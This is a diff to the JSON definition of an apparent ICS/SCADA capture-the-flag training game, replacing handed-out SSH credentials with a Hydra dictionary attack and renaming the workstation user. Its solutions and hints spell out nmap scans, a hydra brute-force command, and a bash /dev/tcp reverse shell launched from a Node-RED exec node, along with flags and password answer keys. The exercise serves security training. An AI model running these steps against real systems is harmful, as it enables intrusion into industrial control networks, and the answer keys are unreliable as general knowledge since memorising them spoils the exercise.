@@ -45,9 +45,9 @@
       "estimated_duration": 10,
       "minimal_possible_solve_time": 1,
       "answer": "FLAG{IDMZ_JUMP_ACCESSED}",
-      "content": "### The Situation\n\nYour initial reconnaissance indicates that direct routing from your corporate Kali host to the SCADA operations network (`192.168.100.0/24`) is blocked by the perimeter gateway firewall. This enforces standard IEC 62443 zone architectures, which forbid direct corporate-to-operations paths.\n\nHowever, a Level 3.5 Industrial DMZ (IDMZ) is configured with an exposed jump host in the `192.168.50.0/24` subnet for remote engineering access.\n\n### Your Objective\n\n1. Scan the IDMZ subnet (`192.168.50.0/24`) using `nmap` from your Kali host to locate the active jump host.\n2. Connect via SSH to the jump host (`192.168.50.50`) using the credentials: Username: `operator` / Password: `operator123`.\n3. Read the flag file located at `/home/operator/flag.txt` to complete this level.\n",
-      "solution": "1. Run a port scan from the Kali console: `nmap -p 22 --open 192.168.50.0/24`\n2. Note the active jump host at `192.168.50.50` running SSH.\n3. Log in to the jump host: `ssh operator@192.168.50.50` (using password `operator123`).\n4. Print the flag: `cat flag.txt` to retrieve `FLAG{IDMZ_JUMP_ACCESSED}`.",
-      "max_score": 50,
+      "content": "### The Situation\n\nYour initial reconnaissance indicates that direct routing from your corporate Kali host to the SCADA operations network (`192.168.100.0/24`) is blocked by the perimeter gateway firewall. This enforces standard IEC 62443 zone architectures, which forbid direct corporate-to-operations paths.\n\nHowever, a Level 3.5 Industrial DMZ (IDMZ) is configured with an exposed jump host in the `192.168.50.0/24` subnet for remote engineering access.\n\n### Your Objective\n\n1. Scan the IDMZ subnet (`192.168.50.0/24`) using `nmap` from your Kali host to locate the active jump host.\n2. You don't have any credentials, but you know that the user **`operator`** has a weak password. You must guess it using a dictionary attack. A common passwords list (`passlist.txt`) is placed in your home directory for your convenience.\n3. Leverage a password attack tool (like `hydra`) to find the SSH password of the `operator` user on the jump host.\n4. Connect via SSH to the jump host (`192.168.50.50`) using the cracked credentials.\n5. Read the flag file located at `/home/operator/flag.txt` to complete this level.\n",
+      "solution": "1. Run a port scan from the Kali console: `nmap -p 22 --open 192.168.50.0/24` to locate the jump host at `192.168.50.50`.\n2. Perform a dictionary attack on the SSH service using Hydra: `hydra -l operator -P passlist.txt ssh://192.168.50.50` (reveals password `operator123`).\n3. Log in to the jump host: `ssh operator@192.168.50.50` (using password `operator123`).\n4. Print the flag: `cat flag.txt` to retrieve `FLAG{IDMZ_JUMP_ACCESSED}`.",
+      "max_score": 100,
       "hints": [
         {
           "title": "DMZ Host Discovery",
@@ -56,8 +56,8 @@
           "order": 0
         },
         {
-          "title": "SSH Login Credentials",
-          "content": "Log in via SSH to `192.168.50.50` using the username `operator` and password `operator123`.",
+          "title": "Tool for password attacks",
+          "content": "Common tools for password attacks are **hydra** and **medusa**. Run `hydra -l operator -P passlist.txt ssh://192.168.50.50` to test the password dictionary against the operator user. Use `ls` to list files in your home directory.",
           "hint_penalty": 20,
           "order": 1
         }
@@ -69,10 +69,14 @@
       "mitre_techniques": [
         {
           "technique_key": "TA0008.T1021.004"
+        },
+        {
+          "technique_key": "TA0006.T1110"
         }
       ],
       "expected_commands": [
         "nmap.*192.168.50.*",
+        "hydra.*",
         "ssh operator@192.168.50.50",
         "cat flag.txt"
       ],
@@ -151,25 +155,25 @@
       "expected_commands": [],
       "commands_required": false
     },
-    {
+     {
       "title": "CREDENTIAL ACCESS: Operator Secrets",
       "level_type": "TRAINING_LEVEL",
       "order": 5,
       "estimated_duration": 5,
-      "answer": "operator123",
-      "content": "### The Situation\n\nYou have compromised the SCADA HMI web portal, but direct access to the PLC control network remains blocked. To pivot further, you need credentials for the Engineering Workstation (EWS).\n\n### Your Objective\n\n1. Explore the file system of the compromised SCADA HMI.\n2. Look inside operator home directories for configuration parameters or leaked credentials.\n3. Find the operator password stored in the credentials file.\n\nWhat is the password of the operator user?",
-      "solution": "Use the Node-RED exec node to run: `cat /home/debian/ews_credentials.txt`. Copy the password value: `operator123`.",
+      "answer": "EngineeringPass2026!",
+      "content": "### The Situation\n\nYou have compromised the SCADA HMI web portal, but direct access to the PLC control network remains blocked. To pivot further, you need credentials for the Engineering Workstation (EWS).\n\n### Your Objective\n\n1. Explore the file system of the compromised SCADA HMI.\n2. Look inside operator home directories for configuration parameters or leaked credentials.\n3. Find the engineer password stored in the credentials file.\n\nWhat is the password of the engineer user?",
+      "solution": "Use the Node-RED exec node to run: `cat /home/debian/ews_credentials.txt`. Copy the password value: `EngineeringPass2026!`.",
       "max_score": 50,
       "hints": [
         {
-          "title": "Finding Operator Credentials",
-          "content": "Plant operators frequently save backup configurations or notes in their home directories. Use the shell executor to list the contents of the `/home/debian/` directory to check for any credentials files.",
+          "title": "Finding Engineer Credentials",
+          "content": "Plant engineers frequently save backup configurations or notes in operator home directories. Use the shell executor to list the contents of the `/home/debian/` directory to check for any credentials files.",
           "hint_penalty": 10,
           "order": 0
         },
         {
           "title": "Exact Credential File Path",
-          "content": "Read the content of the credentials backup file: `cat /home/debian/ews_credentials.txt` to extract the operator password.",
+          "content": "Read the content of the credentials backup file: `cat /home/debian/ews_credentials.txt` to extract the engineer password.",
           "hint_penalty": 20,
           "order": 1
         }
@@ -193,18 +197,18 @@
       "estimated_duration": 15,
       "answer": "192.168.20.10",
       "content": "### The Situation\n\nYou now hold credentials for the Engineering Workstation (EWS), which has administrative access to the PLC network. This step mimics the **2015 Ukraine Power Grid cyberattack**, where attackers pivoted from the compromised corporate subnets to the high-privilege EWS nodes to control remote substations.\n\nDirect access to the control subnet (`192.168.20.0/24`) is blocked from Kali, but is permitted from the SCADA HMI.\n\n### Your Objective\n\n1. Establish an interactive terminal connection to the EWS at `192.168.20.20` using the stolen credentials.\n2. Scan the internal control subnet (`192.168.20.0/24`) to identify the IP address of the active PLC.\n\nWhat is the IP address of the PLC?",
-      "solution": "1. Start a netcat listener on Kali: nc -nlvp 4444\n2. Configure a Node-RED exec node command with the reverse shell: bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' and trigger it.\n3. On the caught shell, upgrade the PTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n4. SSH into EWS: ssh operator@192.168.20.20 (use password operator123)\n5. Find the active PLC by running: nmap -sn 192.168.20.0/24 to identify 192.168.20.10.",
+      "solution": "1. Start a netcat listener on Kali: nc -nlvp 4444\n2. Configure a Node-RED exec node command with the reverse shell: bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' and trigger it.\n3. On the caught shell, upgrade the PTY: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n4. SSH into EWS: ssh engineer@192.168.20.20 (use password EngineeringPass2026!)\n5. Find the active PLC by running: nmap -sn 192.168.20.0/24 to identify 192.168.20.10.",
       "max_score": 50,
       "hints": [
         {
           "title": "SSH Credential Recall",
-          "content": "The operator credentials extracted from the HMI are: User: `operator`, Password: `operator123`.",
+          "content": "The engineer credentials extracted from the HMI are: User: `engineer`, Password: `EngineeringPass2026!`.",
           "hint_penalty": 10,
           "order": 0
         },
         {
           "title": "Interactive Pivot via PTY Upgrade (Crucial)",
-          "content": "A raw Node-RED shell cannot handle interactive SSH password prompts. You must catch a full terminal session on Kali:\n1. On Kali, start a listener: `nc -nlvp 4444`.\n2. Deploy a Node-RED exec node containing: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'` and trigger it.\n3. Once the connection is caught on Kali, upgrade the raw stream to a Pseudo-Terminal (PTY): `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`.\n4. You can now run `ssh operator@192.168.20.20` and type the password manually.",
+          "content": "A raw Node-RED shell cannot handle interactive SSH password prompts. You must catch a full terminal session on Kali:\n1. On Kali, start a listener: `nc -nlvp 4444`.\n2. Deploy a Node-RED exec node containing: `bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'` and trigger it.\n3. Once the connection is caught on Kali, upgrade the raw stream to a Pseudo-Terminal (PTY): `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`.\n4. You can now run `ssh engineer@192.168.20.20` and type the password manually.",
           "hint_penalty": 20,
           "order": 1
         },
@@ -230,7 +234,7 @@
       "expected_commands": [
         "nc -nlvp.*",
         "python3 -c.*pty\\.spawn.*",
-        "ssh operator@192\\.168\\.20\\.20",
+        "ssh engineer@192\\.168\\.20\\.20",
         "nmap.*192\\.168\\.20\\..*"
       ],
       "commands_required": true
